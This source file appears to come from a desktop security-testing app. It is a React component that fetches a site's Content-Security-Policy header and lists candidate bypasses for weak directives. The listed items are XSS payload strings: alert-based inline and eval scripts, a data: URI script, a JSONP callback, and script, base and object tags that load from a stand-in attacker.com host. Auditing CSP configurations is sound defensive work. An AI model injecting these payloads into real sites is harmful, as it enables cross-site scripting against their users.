import { useState } from 'react';
import { useStore } from '../../store/store';
import styles from './SharedTool.module.css';
import ToolWrapper from './ToolWrapper';
import { ShieldIcon, LoadingIcon } from '../common/Icons';

export default function CSPBypass() {
  const { addToolResult } = useStore();
  const [targetUrl, setTargetUrl] = useState('');
  const [results, setResults] = useState<Array<{ policy: string; bypasses: string[] }>>([]);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);

  const analyzeCSP = async () => {
    if (!targetUrl.trim()) {
      setError('Target URL is required');
      return;
    }

    setLoading(true);
    setError(null);
    setResults([]);

    try {
      const result = await window.electronAPI.net.httpFetch(targetUrl, {
        method: 'GET',
        timeout: 5000,
      });

      const headers = result.headers || {};
      const cspHeader =
        headers['content-security-policy'] || headers['Content-Security-Policy'] || '';

      if (!cspHeader) {
        setError('No CSP header found');
        setLoading(false);
        return;
      }

      const bypasses: Array<{ policy: string; bypasses: string[] }> = [];

      if (cspHeader.includes("'unsafe-inline'")) {
        bypasses.push({
          policy: 'unsafe-inline',
          bypasses: ['<script>alert(1)</script>', '<img src=x onerror=alert(1)>'],
        });
      }

      if (cspHeader.includes("'unsafe-eval'")) {
        bypasses.push({
          policy: 'unsafe-eval',
          bypasses: ['eval("alert(1)")', 'setTimeout("alert(1)",0)'],
        });
      }

      if (cspHeader.includes('*')) {
        bypasses.push({
          policy: 'Wildcard source',
          bypasses: ['<script src="https://attacker.com/xss.js"></script>'],
        });
      }

      const jsonpDomains = ['googleapis.com', 'google.com', 'ajax.googleapis.com'];
      for (const domain of jsonpDomains) {
        if (cspHeader.includes(domain)) {
          bypasses.push({
            policy: `Whitelisted domain: ${domain}`,
            bypasses: [`<script src="https://${domain}/jsonp?callback=alert"></script>`],
          });
        }
      }

      if (cspHeader.includes('data:')) {
        bypasses.push({
          policy: 'data: URI allowed',
          bypasses: ['<script src="data:text/javascript,alert(1)"></script>'],
        });
      }

      if (!cspHeader.includes('base-uri')) {
        bypasses.push({
          policy: 'No base-uri directive',
          bypasses: ['<base href="https://attacker.com/">'],
        });
      }

      if (!cspHeader.includes('object-src')) {
        bypasses.push({
          policy: 'No object-src directive',
          bypasses: ['<object data="https://attacker.com/xss.swf">'],
        });
      }

      setResults(bypasses);

      addToolResult({
        id: Date.now().toString(),
        toolName: 'CSP Bypass Analyzer',
        timestamp: Date.now(),
        input: { targetUrl, csp: cspHeader },
        output: bypasses,
        success: true,
      });
    } catch (err: unknown) {
      const message = err instanceof Error ? err.message : 'CSP analysis failed';
      setError(message);
    } finally {
      setLoading(false);
    }
  };

  return (
    <ToolWrapper
      title="CSP Bypass Analyzer"
      icon={<ShieldIcon />}
      description="Analyze Content Security Policy for potential bypasses"
    >
      <div className={styles.section}>
        <div className={styles.inputGroup}>
          <label className={styles.label}>Target URL</label>
          <input
            type="text"
            className={styles.input}
            placeholder="https://example.com"
            value={targetUrl}
            onChange={(e) => setTargetUrl(e.target.value)}
          />
        </div>

        <div className={styles.buttonGroup}>
          <button className={styles.primaryBtn} onClick={analyzeCSP} disabled={loading}>
            {loading ? (
              <>
                <LoadingIcon /> Analyzing...
              </>
            ) : (
              'Analyze CSP'
            )}
          </button>
        </div>
      </div>

      {error && <div className={styles.errorBox}>{error}</div>}

      {loading && (
        <div className={styles.loadingBox}>
          <div className={styles.spinner}></div>
          <span>Analyzing CSP policy...</span>
        </div>
      )}

      {results.length > 0 && (
        <div className={styles.resultBox}>
          <div className={styles.resultHeader}>
            <span className={styles.resultTitle}>Potential CSP Bypasses</span>
          </div>
          {results.map((result, idx) => (
            <div key={idx} className={styles.resultItem}>
              <span style={{ color: '#ff6b8a', fontFamily: 'var(--font-mono)' }}>
                {result.policy}
              </span>
              {result.bypasses.map((bypass, bidx) => (
                <span
                  key={bidx}
                  style={{
                    color: 'var(--color-text-tertiary)',
                    fontSize: '11px',
                    marginTop: '4px',
                    marginLeft: '10px',
                    display: 'block',
                  }}
                >
                  {bypass}
                </span>
              ))}
            </div>
          ))}
        </div>
      )}

      {!loading && results.length === 0 && targetUrl && !error && (
        <div className={styles.successBox}>No obvious CSP bypasses found</div>
      )}
    </ToolWrapper>
  );
}
